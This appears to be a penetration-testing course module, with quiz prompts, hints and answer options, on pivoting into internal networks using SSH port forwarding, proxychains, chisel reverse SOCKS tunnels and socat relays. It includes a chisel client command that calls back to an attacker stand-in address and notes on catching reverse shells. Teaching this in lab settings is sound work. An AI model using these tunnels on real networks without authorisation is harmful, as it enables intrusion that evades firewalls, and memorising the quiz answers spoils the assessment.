title: Pivoting and Tunneling: move through the internal network
description: SSH local/forward/remote port forwarding, SOCKS with proxychains and chisel tunnels: from one shell to the whole internal network.

1.title: SSH port forwarding: -L, -R and -D
1.body:
## The foothold

Typical scenario: you scan the DMZ, compromise `10.10.10.5`, and from that
machine you discover `192.168.1.0/24` — an internal network your Kali cannot
reach directly. Everything that follows assumes valid SSH credentials
on the pivot (by password, stolen key, or your own shell upgraded to
SSH).

## Local forward (-L): an internal service on your localhost

```bash
# Opens http://localhost:8080 on your Kali = 192.168.1.20:8080 as seen from the pivot:
ssh -N -L 8080:192.168.1.20:8080 usuario@10.10.10.5

# -N: do not run a shell, just the tunnel
# Now from YOUR machine:
curl http://localhost:8080
nmap -sV -p 8080 localhost        # fingerprinting the internal service
```

The destination (`192.168.1.20`) does NOT have to be the SSH server itself: SSH
connects from the pivot to wherever you tell it. That detail is what
turns -L into an internal network scanner.

## Remote forward (-R): your machine visible from inside

```bash
# The reverse: port 9001 on the PIVOT forwards to your 9001
ssh -N -R 9001:127.0.0.1:9001 usuario@10.10.10.5
```

The star use case: an internal victim runs your reverse shell
pointing at `10.10.10.5:9001` (its own network) and that connection lands on
your Kali listener. No new firewall rules, no internet
egress from the internal segment.

## Dynamic SOCKS (-D): the tunnel that works for everything

```bash
# A single tunnel, any destination:
ssh -N -D 1080 usuario@10.10.10.5
```

`localhost:1080` is now a **SOCKS5** proxy that routes any
connection through the pivot. Unlike -L (one fixed destination per
tunnel), SOCKS decides the destination on every connection — perfect for
scanning entire ranges. How to use it: the next task.

## Cheat sheet for the three

| Flag | Direction | Typical use |
|---|---|---|
| `-L` | YOUR machine → via pivot → destination | Reach one specific internal service |
| `-R` | Pivot's network → YOUR machine | Receive shells/callbacks from inside |
| `-D` | YOUR machine: universal SOCKS proxy | Scan/browse the whole internal network |

pivoting-y-tunneling-t01-q01.prompt: Which SSH flag creates a LOCAL tunnel: a port on YOUR machine listening and forwarding to a destination only visible from the SSH server?

pivoting-y-tunneling-t01-q02.prompt: You have SSH credentials on 10.10.10.5 (DMZ) and from there an internal web service runs on 192.168.1.20:8080 you cannot see from outside. Write the full command to open it on your localhost:8080.

pivoting-y-tunneling-t01-q03.prompt: Which SSH flag does the INVERSE: exposes a service on YOUR machine to the SSH server's network?
pivoting-y-tunneling-t01-q03.hint: -R (remote): -R remotePort:localHost:localPort — the classic for catching a reverse shell in a segment with no egress

pivoting-y-tunneling-t01-q04.prompt: Which SSH flag raises a dynamic SOCKS4/5 proxy (one port routing to ANY destination reachable by the server)?

2.title: proxychains: any tool through the tunnel
2.body:
## Configuring proxychains

```bash
sudo nano /etc/proxychains4.conf

# At the end of the file, in [ProxyList], comment out whatever is there and add:
socks5 127.0.0.1 1080
```

With the SOCKS from the previous task's `ssh -D 1080` alive, any
tool that respects proxies starts to "live" inside the internal network:

```bash
proxychains nmap -sT -Pn -n --top-ports 100 192.168.1.0/24
proxychains curl http://192.168.1.20:8080
proxychains python3 -m http.server  # no — this is a server; proxychains proxies CLIENTS
```

Watch out for that last one: proxychains intercepts OUTGOING connections. An
`http.server` set up this way gains nothing — servers are exposed with
SSH's -R/-L forwards.

## Scanning the internal network without burning the tunnel

ICMP does not travel through SOCKS (it is TCP-only): `proxychains ping` ALWAYS fails.
The correct internal scan:

```bash
# Host discovery without ping, full TCP connection (-sT, half-open SYN does not work over SOCKS):
proxychains nmap -sT -Pn -n --min-rate 50 --top-ports 100 192.168.1.0/24

# Against a specific host you already found:
proxychains nmap -sT -Pn -n -sV -p 21,22,80,443,3389,8080 192.168.1.20
```

`-Pn` (treat as up) and `-n` (do not resolve DNS — resolution through the
tunnel would use the internal resolver, better kept under control) are
de facto mandatory in scans through a proxy.

## The limits of proxychains

- TCP only (no ICMP/UDP).
- Applications that ignore proxies (static binaries, some
  exploits using raw sockets) do not go through the tunnel.
- Modern alternative when you need UDP/DNS: `sshuttle` (transparent
  via iptables) — think of it as a "poor man's VPN": `sshuttle -r
  usuario@10.10.10.5 192.168.1.0/24` and ALL your traffic to that network
  travels over SSH with no further configuration.

## Chain modes

`proxychains.conf` opens with the mode: `strict` walks the ProxyList
in a fixed order; `dynamic` skips dead proxies; `random` randomizes (with
`chain_len`). For single-hop pivoting any of them works — the detail
matters when chaining 2+ hops.

pivoting-y-tunneling-t02-q01.prompt: In which file does proxychains configure its default SOCKS proxy (full Linux path)?

pivoting-y-tunneling-t02-q02.prompt: Write the line you would add to the ProxyList to use the SOCKS5 from the previous task's SSH.

pivoting-y-tunneling-t02-q03.prompt: Why does proxychains NEVER route ICMP (ping), and which nmap option replaces ping for host discovery through the SOCKS?
pivoting-y-tunneling-t02-q03.hint: SOCKS only encapsulates TCP; ping is ICMP — use nmap -Pn (or -sn with TCP) and treat hosts as up

pivoting-y-tunneling-t02-q04.prompt: Which proxychains mode switches to the next proxy in the list when one fails (ideal when chaining several pivots)?
pivoting-y-tunneling-t02-q04.hint: Three modes: dynamic, strict (fixed order) and random — the one that skips dead proxies is dynamic

3.title: No SSH: chisel and socat
3.body:
## When there is no SSH

Many pivots (a web shell, a Windows box without OpenSSH, an IoT device) do not
give you SSH. The two tools that fill that gap:

## chisel: the HTTP/WebSocket tunnel

A single binary (Go) that runs the same on your Kali, on the pivot's
Windows or on the ARM chip of an IP camera. You upload the binary, run it, and
you get SOCKS or port forwards over a channel that crosses HTTP proxies
(WebSockets disguised as web traffic).

**Reverse tunnel (the most common case — internal network with no inbound):**

```bash
# 1. On YOUR Kali (the chisel server, listening on 443, which is usually allowed):
./chisel server -p 443 --reverse

# 2. On the PIVOT (upload the chisel binary for its architecture):
./chisel client https://TU_IP:443 R:socks

# 3. Result: SOCKS5 on YOUR localhost:1080 exiting through the pivot
proxychains nmap -sT -Pn -n 192.168.1.0/24 --top-ports 100
```

Notice the direction: the pivot CONNECTS TO you. No new inbound
ports in the internal segment; the firewall sees a normal outbound
HTTPS connection. `--reverse` authorizes the client to register
listeners on your server.

**One-off port forward** (the equivalent of `ssh -L`):

```bash
# Kali: ./chisel server -p 443 --reverse
# Pivot: ./chisel client https://TU_IP:443 R:8080:192.168.1.20:8080
# → YOUR localhost:8080 = 192.168.1.20:8080 via pivot
```

## socat: the universal TCP cable

When you only need a direct relay and the binary is already on the
target (socat is common on Linux):

```bash
# On the pivot: pivot's 8080 → internal service
socat TCP-LISTEN:8080,fork,reuseaddr TCP:192.168.1.20:8080 &

# Now from outside you point at pivot:8080 (if the DMZ allows it)
curl http://10.10.10.5:8080
```

Unencrypted and unauthenticated — perfect inside a segment that you
control temporarily, unforgivable on the first hop. socat is also
useful for file transfer (`socat TCP-LISTEN:9001 FILE:chisel_bin`),
interactive shells and dozens of other relays: it is the wildcard.

## Quick choice

| Situation | Tool |
|---|---|
| SSH credentials on the pivot | `ssh -D` + proxychains |
| No SSH, HTTPS egress from the pivot | chisel reverse SOCKS |
| Simple one-port relay, socat already present | socat |
| You need UDP/DNS through the tunnel | sshuttle or VPN (WireGuard) |

pivoting-y-tunneling-t03-q01.prompt: What language is chisel written in (giving it the single multi-platform binary you upload to the pivot)?
pivoting-y-tunneling-t03-q01.hint: Go — the same reason modern C2s use it too

pivoting-y-tunneling-t03-q02.prompt: Write the chisel CLIENT command to run on pivot 10.10.10.5 to open a reverse SOCKS5 to your Kali (which listens on port 443; use TU_IP as your address).
pivoting-y-tunneling-t03-q02.hint: On YOUR Kali: chisel server -p 443 --reverse; on the pivot: chisel client https://TU_IP:443 R:socks

pivoting-y-tunneling-t03-q03.prompt: With socat: which option on the pivot forwards a local port to another host (a minimal 'port forward' relay)?
pivoting-y-tunneling-t03-q03.hint: socat TCP-LISTEN:8080,fork TCP:192.168.1.20:80 — listens on 8080 and relays to the internal host

pivoting-y-tunneling-t03-q04.prompt: What KEY advantage does chisel's reverse mode (--reverse) have on networks with a strict egress firewall?
pivoting-y-tunneling-t03-q04.hint: Think about who initiates the connection and which firewall rules that requires in the internal segment.

options.a: It encrypts traffic with a stronger key than SSH
options.b: It lets you scan UDP through the tunnel
options.c: The connection is initiated by the pivot outward (outbound), with no inbound ports
options.d: It avoids having to run any binary on the pivot
